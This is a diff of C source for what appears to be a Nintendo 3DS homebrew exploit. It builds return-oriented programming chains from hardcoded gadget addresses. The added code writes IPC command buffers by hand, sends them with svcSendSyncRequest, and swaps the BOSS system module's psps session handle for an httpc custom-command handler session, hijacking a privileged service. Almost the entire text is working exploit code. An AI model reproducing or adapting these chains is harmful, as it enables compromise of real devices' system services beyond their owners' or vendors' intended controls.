@@ -48,7 +48,7 @@ u32 ROP_LDRR0SP0_POPR3PC = 0x0011538b;//"ldr r0, [sp, #0]" "pop {r3, pc}"
 
 u32 ROP_POPR3PC;
 
-u32 ROP_BLXR4_POPR1R2R3R4R5R6R7PC = 0x00103183;//"blx r4" "pop {r1, r2, r3, r4, r5, r6, r7, pc}"
+u32 ROP_BLXR4_POPR3R4R5PC = 0x00138225;//"blx r4" "pop {r3, r4, r5, pc}"
 
 u32 ROP_MOVR1R0_BXLR = 0x0013b23d;//"mov r1, r0" "bx lr"
 
@@ -57,6 +57,13 @@ u32 ROP_ADDR0R0R3_POPR2R3R4R5R6PC = 0x00104eb1;//"adds r0, r0, r3" "pop {r2, r3,
 u32 ROP_httpc_CreateContext = 0x001212d9;//inr0=_this inr1=url* inr2=u8 reqmethod inr3=flag. When flag is non-zero, use SetProxyDefault.
 u32 ROP_httpc_CloseContext = 0x00123d55;//inr0=_this
 u32 ROP_httpc_AddRequestHeader = 0x00120751;//inr0=_this inr1=namestr* inr2=valuestr*
+
+u32 ROP_svcSendSyncRequest = 0x001278ec;//svc 0x32 bx-lr
+u32 ROP_svcCloseHandle = 0x0012790c;//svc 0x23 bx-lr
+
+u32 ROP_get_tls = 0x00127a24;//r0 = tls+0 then bx-lr.
+
+u32 BOSS_psps_sessionhandle = 0x0014b204;
 
 u32 contentdatabuf_addr = 0x08032c00;//Unused memory near the end of the heap.
 
@@ -168,18 +175,18 @@ void ropgen_setr4(u32 **ropchain, u32 *ropvaddr, u32 value)//Total size: 0x8-byt
 	ropgen_addword(ropchain, ropvaddr, value);
 }
 
-void ropgen_blxr4_popr1r2r3r4r5r6r7pc(u32 **ropchain, u32 *ropvaddr, u32 addr, u32 *regs)//Total size: 0x28-bytes.
+void ropgen_blxr4_popr3r4r5pc(u32 **ropchain, u32 *ropvaddr, u32 addr, u32 *regs)//Total size: 0x18-bytes.
 {
 	ropgen_setr4(ropchain, ropvaddr, addr);
 
-	ropgen_addword(ropchain, ropvaddr, ROP_BLXR4_POPR1R2R3R4R5R6R7PC);
+	ropgen_addword(ropchain, ropvaddr, ROP_BLXR4_POPR3R4R5PC);
 
-	ropgen_addwords(ropchain, ropvaddr, regs, 7);
+	ropgen_addwords(ropchain, ropvaddr, regs, 3);
 }
 
-void ropgen_movr1r0(u32 **ropchain, u32 *ropvaddr)//Total size: 0x28-bytes.
+void ropgen_movr1r0(u32 **ropchain, u32 *ropvaddr)//Total size: 0x18-bytes.
 {
-	ropgen_blxr4_popr1r2r3r4r5r6r7pc(ropchain, ropvaddr, ROP_MOVR1R0_BXLR, NULL);
+	ropgen_blxr4_popr3r4r5pc(ropchain, ropvaddr, ROP_MOVR1R0_BXLR, NULL);
 }
 
 void ropgen_ldrr0r1(u32 **ropchain, u32 *ropvaddr, u32 addr, u32 set_addr)//Total size: 0x14-bytes.
@@ -196,20 +203,20 @@ void ropgen_ldrr0r1(u32 **ropchain, u32 *ropvaddr, u32 addr, u32 set_addr)//Tota
 	ropgen_addword(ropchain, ropvaddr, ROP_LDRR0R1_BXR2);
 }
 
-void ropgen_strr0r1(u32 **ropchain, u32 *ropvaddr, u32 addr, u32 set_addr)//Total size: 0x28-bytes + <0x10 if set_addr is set>.
+void ropgen_strr0r1(u32 **ropchain, u32 *ropvaddr, u32 addr, u32 set_addr)//Total size: 0x18-bytes + <0x10 if set_addr is set>.
 {
 	if(set_addr)ropgen_popr1r2r3pc(ropchain, ropvaddr, addr, 0, 0);
 
-	ropgen_blxr4_popr1r2r3r4r5r6r7pc(ropchain, ropvaddr, ROP_STRR0R1, NULL);
+	ropgen_blxr4_popr3r4r5pc(ropchain, ropvaddr, ROP_STRR0R1, NULL);
 }
 
-void ropgen_copyu32(u32 **ropchain, u32 *ropvaddr, u32 ldr_addr, u32 str_addr, u32 set_addr)//Total size: 0x3c + <0x10 if set_addr bit1 is set>.
+void ropgen_copyu32(u32 **ropchain, u32 *ropvaddr, u32 ldr_addr, u32 str_addr, u32 set_addr)//Total size: 0x2c + <0x10 if set_addr bit1 is set>.
 {
 	ropgen_ldrr0r1(ropchain, ropvaddr, ldr_addr, set_addr & 0x1);
 	ropgen_strr0r1(ropchain, ropvaddr, str_addr, set_addr & 0x2);
 }
 
-void ropgen_writeu32(u32 **ropchain, u32 *ropvaddr, u32 value, u32 addr, u32 set_addr)//Total size: 0x30-bytes + <0x10 if set_addr is set>.
+void ropgen_writeu32(u32 **ropchain, u32 *ropvaddr, u32 value, u32 addr, u32 set_addr)//Total size: 0x20-bytes + <0x10 if set_addr is set>.
 {
 	ropgen_setr0(ropchain, ropvaddr, value);
 	ropgen_strr0r1(ropchain, ropvaddr, addr, set_addr);
@@ -232,11 +239,45 @@ void ropgen_stackpivot(u32 **ropchain, u32 *ropvaddr, u32 addr)//Total size: 0x8
 	ropgen_addword(ropchain, ropvaddr, addr - (*ropvaddr + 4));
 }
 
-void ropgen_callfunc(u32 **ropchain, u32 *ropvaddr, u32 funcaddr, u32 *params)//Total size: 0x48. Word-size of params is 11.
+void ropgen_callfunc(u32 **ropchain, u32 *ropvaddr, u32 funcaddr, u32 *params)//Total size: 0x18 + <0x20 when params is set>. Word-size of params is 7.
 {
-	ropgen_popr0r1r2r3r4r5r6pc(ropchain, ropvaddr, params[0], params[1], params[2], params[3], 0, 0, 0);
+	u32 *stackparams = NULL;
+	if(params)
+	{
+		stackparams = &params[4];
+		ropgen_popr0r1r2r3r4r5r6pc(ropchain, ropvaddr, params[0], params[1], params[2], params[3], 0, 0, 0);
+	}
 
-	ropgen_blxr4_popr1r2r3r4r5r6r7pc(ropchain, ropvaddr, funcaddr, &params[4]);
+	ropgen_blxr4_popr3r4r5pc(ropchain, ropvaddr, funcaddr, stackparams);
+}
+
+void ropgen_writecmdbufvalue(u32 **ropchain, u32 *ropvaddr, u32 offset, u32 valueaddr, u32 loadaddr)//Total size: 0x7c + <0x40 with loadaddr set>. Normally valueaddr is written directly to the cmdbuf, but when loadaddr is non-zero *valueaddr is written instead.
+{
+	u32 value=0;
+
+	if(loadaddr==0)value=valueaddr;
+	if(loadaddr)ropgen_copyu32(ropchain, ropvaddr, valueaddr, (*ropvaddr)+0x3c+0x54, 0x3);//Overwrite the value below.
+
+	ropgen_callfunc(ropchain, ropvaddr, ROP_get_tls, NULL);//r0 = tls+0
+	ropgen_addr0r3_popr2r3r4r5r6(ropchain, ropvaddr, 0x80+offset, NULL);
+	ropgen_movr1r0(ropchain, ropvaddr);
+	ropgen_writeu32(ropchain, ropvaddr, value, 0, 0);
+}
+
+void ropgen_httpc_customcmd(u32 **ropchain, u32 *ropvaddr, u32 httpctx, u32 type, u32 handleindex, u32 handle)
+{
+	u32 loadaddrhandle = 0;
+	if(handle)loadaddrhandle = 1;
+
+	ropgen_writecmdbufvalue(ropchain, ropvaddr, 0<<2, 0x18010082, 0);//cmdreq[0] = 0x18010082;//cmdhdr
+	ropgen_writecmdbufvalue(ropchain, ropvaddr, 1<<2, type, 0);//cmdreq[1] = type;
+	ropgen_writecmdbufvalue(ropchain, ropvaddr, 2<<2, handleindex, 0);//cmdreq[2] = handleindex;
+	ropgen_writecmdbufvalue(ropchain, ropvaddr, 3<<2, 0, 0);//cmdreq[3] = IPC_Desc_SharedHandles(1);
+	ropgen_writecmdbufvalue(ropchain, ropvaddr, 4<<2, handle, loadaddrhandle);//writeval = handle; if(handle){writeval = *handle;} cmdreq[4] = writeval;
+
+	//Run svcSendSyncRequest with the httpctx session handle.
+	ropgen_ldrr0r1(ropchain, ropvaddr, httpctx+12, 1);
+	ropgen_callfunc(ropchain, ropvaddr, ROP_svcSendSyncRequest, NULL);
 }
 
 void buildrop_config(u32 *ropchain, u32 *ropvaddr, u32 ropchain_maxsize)
@@ -278,7 +319,7 @@ void buildrop_http(u32 *ropchain, u32 *ropvaddr, u32 ropchain_maxsize)
 	u32 httpctx = ropheap+0x0;
 	u32 datastorageaddr;
 
-	u32 params[11];
+	u32 params[7];
 	u32 datastorage[(0x28+0xc+0x4+0x40)>>2];//The +0x40 is needed to avoid corruption on stack.
 
 	//Embed the URL in the ropchain data.
@@ -310,9 +351,19 @@ void buildrop_http(u32 *ropchain, u32 *ropvaddr, u32 ropchain_maxsize)
 	params[2] = datastorageaddr+0x34;//r2 = valuestr*
 	ropgen_callfunc(&ropchain, ropvaddr, ROP_httpc_AddRequestHeader, params);//Once this finishes, the ctr-httpwn custom-cmdhandler will be available via the context session handle.
 
-	memset(params, 0, sizeof(params));
+	ropgen_httpc_customcmd(&ropchain, ropvaddr, httpctx, 0, 0, BOSS_psps_sessionhandle);//Send the sysmodule psps handle to the httpc custom-cmdhandler.
+
+	//Copy the sysmodule psps handle to ropheap+0x20, then overwrite the sysmodule psps handle with the custom-cmdhandler session handle. Then close the original handle since it's not used under BOSS sysmodule at this point.
+	ropgen_copyu32(&ropchain, ropvaddr, BOSS_psps_sessionhandle, ropheap+0x20, 0x3);
+	ropgen_copyu32(&ropchain, ropvaddr, httpctx+12, BOSS_psps_sessionhandle, 0x3);
+
+	ropgen_ldrr0r1(&ropchain, ropvaddr, ropheap+0x20, 1);
+	ropgen_callfunc(&ropchain, ropvaddr, ROP_svcCloseHandle, NULL);
+
+	//Can't close the context since the session handle is used as the new psps handle.
+	/*memset(params, 0, sizeof(params));
 	params[0] = httpctx;//r0 = _this
-	ropgen_callfunc(&ropchain, ropvaddr, ROP_httpc_CloseContext, params);
+	ropgen_callfunc(&ropchain, ropvaddr, ROP_httpc_CloseContext, params);*/
 
 	ropgen_addword(&ropchain, ropvaddr, 0x30303030);
 }
